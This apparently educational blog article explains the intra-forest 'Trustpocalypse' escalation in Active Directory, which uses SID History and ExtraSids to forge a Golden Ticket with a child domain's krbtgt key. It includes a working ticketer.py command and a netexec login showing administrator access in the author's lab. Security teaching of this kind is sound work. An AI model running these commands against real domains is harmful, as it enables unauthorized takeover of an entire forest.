+<p>If you’ve already compromised a child domain within a forest and gained high-privilege access, I want to introduce you the Trustpocalypse.</p><br/>
+<p>Trustpocalypse is an intra-forest trust attack technique that abuses SID History to escalate from Domain Admin (or someone with access to the krbtgt key) in a child domain to Enterprise Admin in the forest root. This is why, as Microsoft’s documentation states, <em>"the forest is the ultimate security boundary, not the domain"</em>. Before diving into how this escalation works, let’s first explain what SID History is.</p><br/>
+<p>SID History is an attribute introduced with Windows 2000 to simplify domain-to-domain migrations inside Active Directory. When an account is moved to a new domain, its previous SID and the SIDs of the groups it used to belong to, can be copied into the <em>sidHistory</em> field of the new account. This allows the migrated user to continue accessing resources that still rely on their old permissions. In practice, whenever the user authenticates, any SID listed in their SID History is treated as if it were part of their current security token, meaning they inherit the access rights associated with those former identities or group memberships.</p><br/>
+<p>Within a forest, this behavior becomes especially important. Because of how trust relationships work between domains within the same forest, the SIDs stored in SID History are considered valid when crossing domain boundaries. They aren’t removed by SID Filtering, which normally strips potentially unsafe SIDs during cross-domain authentication. As a result, if an account in a child domain has a highly privileged SID inserted into its SID History, such as the SID of the <strong>Enterprise Admins</strong> group, then that account will effectively operate with Enterprise Admin privileges across the entire forest.</p><br/>
+<p>The <strong>Enterprise Admins</strong> group exists only in the forest root domain and represents one of the most powerful security principals in Active Directory. Members of this group have the authority to manage and modify configuration data that affects every domain in the forest, making it the highest tier of administrative control. Therefore, obtaining access to this group implies a full enterprise compromise, at least within the boundaries of the forest.</p><br/>
+<p>SID Filtering is a security mechanism designed to prevent domains from accepting unauthorized or spoofed SIDs during authentication across a trust. When a user authenticates from a trusted domain, SID Filtering removes any SIDs in the user’s token that should not legitimately originate from that domain. In other words, the trusting domain does not allow SIDs that originate within its own forest to pass through an external trust. For example, if you authenticate from a domain in forestA to a domain in forestB over an external trust, and your SID History contains an SID belonging to a group from forestB, those SIDs will simply be ignored during authentication. This setting is enabled by default for external and forest trusts, and it can also be manually enabled for intra-forest trusts.</p><br/>
+<p>In simpler terms, this means that if you manage to modify a user’s SID History, for example, by adding the SID of the Enterprise Admins group from the forest root, any domain within the same forest will treat that SID as valid during authentication. As a result, the user will effectively receive Enterprise Admin privileges.<br/>
+This only applies to <strong>intra-forest trusts</strong>, since SID History is honored across domains in the same forest. In contrast, for <strong>external or forest (inter-forest) trusts</strong>, this technique does not work because SID Filtering is enabled by default.</p><br/>
+<h3>Golden Tickets even more Golden</h3><br/>
+<p>Formerly, abusing this involved a highly complex process, which included modifying the <strong>sidHistory</strong> in the Active Directory database (ntds.dit) of the associated domain.  Researchers Benjamin Delpy and Sean Metcalf later demonstrated that this type of abuse didn’t actually require modifying <strong>sidHistory</strong> in the AD database at all. Instead, they showed that an attacker with access to the <strong>krbtgt</strong> key of any child domain, something achievable with Domain Admin level rights or even just the ability to perform a DCSync, can directly inject additional SIDs into a forged Kerberos ticket.</p><br/>
+<p>When crafting a Golden Ticket, it’s possible to populate the <strong>ExtraSids</strong> field of the <em>KERB_VALIDATION_INFO</em> structure of the PAC, which is the set of authorization data the domain controller embeds into a user’s logon session. This <code>ExtraSids</code> field is similar to the <code>sidHistory</code> field we mentioned earlier. This field is designed to store SIDs from groups that exist outside the user’s own domain. By inserting a highly privileged SID, such as the SID of <strong>Enterprise Admins</strong> from the forest root, an attacker can effectively grant those privileges to the forged ticket without altering anything in Active Directory.</p><br/>
+<p>The practical impact is significant, because with just a brief compromise of a child domain, an attacker can extract the child domain’s krbtgt hash, forge a ticket that includes the Enterprise Admins SID in ExtraSids, and immediately escalate privileges across the forest. In other words, they can “jump” from a compromised child domain straight to full control of the forest root.</p><br/>
+<h3>Practice</h3><br/>
+<p>Well, let's walk through this attack. First, we need to compromise a child domain within the forest. In this case, I'll assume the domain is compromised and simply extract the krbtgt key.</p><br/>
+<p>There are two main ways to create a Golden Ticket, from Windows or from Linux. I’ll demonstrate how to do it remotely using <code>ticketer.py</code>, but you can also use <code>mimikatz</code> to do the same on Windows.</p><br/>
+<p>I've extracted the krbtgt key of <code>it.elswixcorp.local</code>. Now, let's generate the golden ticket:</p><br/>
+<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="n">ticketer</span><span class="o">.</span><span class="n">py</span> <span class="o">-</span><span class="n">aesKey</span> <span class="n">be6c5cfbd3b18c43fd415e272cb1529e89f04282b539220b6cb0d65f0584fa9e</span> <span class="o">-</span><span class="n">domain</span> <span class="n">it</span><span class="o">.</span><span class="n">elswixcorp</span><span class="o">.</span><span class="n">local</span> <span class="o">-</span><span class="n">domain</span><span class="o">-</span><span class="n">sid</span> <span class="n">S</span><span class="o">-</span><span class="mi">1</span><span class="o">-</span><span class="mi">5</span><span class="o">-</span><span class="mi">21</span><span class="o">-</span><span class="mi">119164063</span><span class="o">-</span><span class="mi">3581140015</span><span class="o">-</span><span class="mi">337040502</span> <span class="o">-</span><span class="n">extra</span><span class="o">-</span><span class="n">sid</span> <span class="n">S</span><span class="o">-</span><span class="mi">1</span><span class="o">-</span><span class="mi">5</span><span class="o">-</span><span class="mi">21</span><span class="o">-</span><span class="mi">2072161790</span><span class="o">-</span><span class="mi">1428925431</span><span class="o">-</span><span class="mi">1872385657</span><span class="o">-</span><span class="mi">519</span> <span class="o">-</span><span class="n">user</span><span class="o">-</span><span class="nb">id</span> <span class="mi">1105</span> <span class="n">ellie</span>
+<span class="n">Impacket</span> <span class="n">v0</span><span class="mf">.13.0</span> <span class="o">-</span> <span class="n">Copyright</span> <span class="n">Fortra</span><span class="p">,</span> <span class="n">LLC</span> <span class="n">and</span> <span class="n">its</span> <span class="n">affiliated</span> <span class="n">companies</span> 
+
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Creating</span> <span class="n">basic</span> <span class="n">skeleton</span> <span class="n">ticket</span> <span class="n">and</span> <span class="n">PAC</span> <span class="n">Infos</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Customizing</span> <span class="n">ticket</span> <span class="n">for</span> <span class="n">it</span><span class="o">.</span><span class="n">elswixcorp</span><span class="o">.</span><span class="n">local</span><span class="o">/</span><span class="n">ellie</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span>    <span class="n">PAC_LOGON_INFO</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span>    <span class="n">PAC_CLIENT_INFO_TYPE</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span>    <span class="n">EncTicketPart</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span>    <span class="n">EncAsRepPart</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Signing</span><span class="o">/</span><span class="n">Encrypting</span> <span class="n">final</span> <span class="n">ticket</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span>    <span class="n">PAC_SERVER_CHECKSUM</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span>    <span class="n">PAC_PRIVSVR_CHECKSUM</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span>    <span class="n">EncTicketPart</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span>    <span class="n">EncASRepPart</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Saving</span> <span class="n">ticket</span> <span class="n">in</span> <span class="n">ellie</span><span class="o">.</span><span class="n">ccache</span>
+</pre></div>
+<p>Great! The ticket was successfully generated with the <strong>extraSids</strong> field. Before moving forward, let’s break down what each parameter above means:</p><br/>
+<ul>
+<li>
+<p><strong><code>-aesKey</code></strong>: The krbtgt AES key of the compromised domain.</p><br/>
+</li>
+<li>
+<p><strong><code>-domain</code></strong>: The domain where the TGT is issued. Since we compromised <code>it.elswixcorp.local</code>, we specify it here.</p><br/>
+</li>
+<li>
+<p><strong><code>-domain-sid</code></strong>: The SID of <code>it.elswixcorp.local</code>.</p><br/>
+</li>
+<li>
+<p><strong><code>-extra-sid</code></strong>: The SID of the Enterprise Administrators group from the forest root.</p><br/>
+</li>
+<li>
+<p><strong><code>-user-id</code></strong>: The RID of the user you want to impersonate.</p><br/>
+</li>
+<li>
+<p><strong><code>ellie</code></strong>: The username we're impersonating, in this case, <em>ellie</em>. You can impersonate any other user, such as <em>Administrator</em>, but remember to update <code>-user-id</code> accordingly (for Administrator, you can omit <code>-user-id</code> because Impacket handles the RID automatically).</p><br/>
+</li>
+</ul>
+<p>Now, let’s use our newly forged ticket to authenticate against <code>elswixcorp.local</code>:</p><br/>
+<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="n">nxc</span> <span class="n">smb</span> <span class="n">dc01</span><span class="o">.</span><span class="n">elswixcorp</span><span class="o">.</span><span class="n">local</span> <span class="o">-</span><span class="n">u</span> <span class="n">ellie</span> <span class="o">--</span><span class="n">use</span><span class="o">-</span><span class="n">kcache</span>
+<span class="n">SMB</span>         <span class="n">dc01</span><span class="o">.</span><span class="n">elswixcorp</span><span class="o">.</span><span class="n">local</span> <span class="mi">445</span>    <span class="n">DC01</span>             <span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Windows</span> <span class="n">Server</span> <span class="mi">2022</span> <span class="n">Build</span> <span class="mi">20348</span> <span class="n">x64</span> <span class="p">(</span><span class="n">name</span><span class="p">:</span><span class="n">DC01</span><span class="p">)</span> <span class="p">(</span><span class="n">domain</span><span class="p">:</span><span class="n">elswixcorp</span><span class="o">.</span><span class="n">local</span><span class="p">)</span> <span class="p">(</span><span class="n">signing</span><span class="p">:</span><span class="kc">True</span><span class="p">)</span> <span class="p">(</span><span class="n">SMBv1</span><span class="p">:</span><span class="kc">False</span><span class="p">)</span> 
+<span class="n">SMB</span>         <span class="n">dc01</span><span class="o">.</span><span class="n">elswixcorp</span><span class="o">.</span><span class="n">local</span> <span class="mi">445</span>    <span class="n">DC01</span>             <span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">IT</span><span class="o">.</span><span class="n">ELSWIXCORP</span><span class="o">.</span><span class="n">LOCAL</span>\<span class="n">ellie</span> <span class="kn">from</span><span class="w"> </span><span class="nn">ccache</span> <span class="p">(</span><span class="n">Pwn3d</span><span class="n">!</span><span class="p">)</span>
+</pre></div>
+<p>As observed, we've successfully authenticated as <code>ellie</code> on <code>elswixcorp.local</code>. As netexec indicates, we now have administrator privileges.</p><br/>
+<p>pretty crazy stuff!</p><br/>
+<h3>How SID filtering would have affected this</h3><br/>
+<p>If SID Filtering had been enabled, or if this were an external trust where SID Filtering is applied by default, the attack would <strong>not</strong> have worked. In that scenario, the SID of the Enterprise Admins group coming from a different forest would be ignored during authentication. This is because, as explained earlier, SID Filtering ignores any SIDs originating from its own forest when they are passed through an external trust.</p><br/>
+<h3>Conclusion</h3><br/>
+<p>Domain Trusts play a major role in how authentication works across an Active Directory environment, and as we’ve seen, they can also introduce powerful attack paths when misconfigured. In this article, we covered how trusts work, how to enumerate them, and how certain group scopes and objects like FSPs behave across domain boundaries. We also walked through the Trustpocalypse technique, showing how an attacker who compromises a child domain can escalate to Enterprise Admin inside the same forest by abusing SID History and ExtraSids injection.</p><br/>
+<p>In the next articles, I’ll apply all of this in a hands-on lab I created, where we’ll explore real trust relationships, identify weaknesses, and move across domains step-by-step.</p><br/>
+<p>I hope you enjoyed the article and found something valuable in it.</p><br/>
+<p><strong>Joaquín Vigliola</strong></p><br/>
+<h3>References</h3><br/>
+<p><a href="https://harmj0y.medium.com/a-guide-to-attacking-domain-trusts-ef5f8992bb9d">https://harmj0y.medium.com/a-guide-to-attacking-domain-trusts-ef5f8992bb9d</a></p><br/>
+<p><a href="https://learn.microsoft.com/en-us/entra/identity/domain-services/concepts-forest-trust">https://learn.microsoft.com/en-us/entra/identity/domain-services/concepts-forest-trust</a></p><br/>
+<p><a href="https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-groups">https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-groups</a></p><br/>
+<p><a href="https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-pac/55fc19f2-55ba-4251-8a6a-103dd7c66280">https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-pac/55fc19f2-55ba-4251-8a6a-103dd7c66280</a></p><br/>
+<p><a href="https://www.thehacker.recipes/ad/movement/trusts/">https://www.thehacker.recipes/ad/movement/trusts/</a></p><br/>
+</div>
+</div>
+</section>
+            </main>
+        </div>
+    </div>
+</body>
+</html>
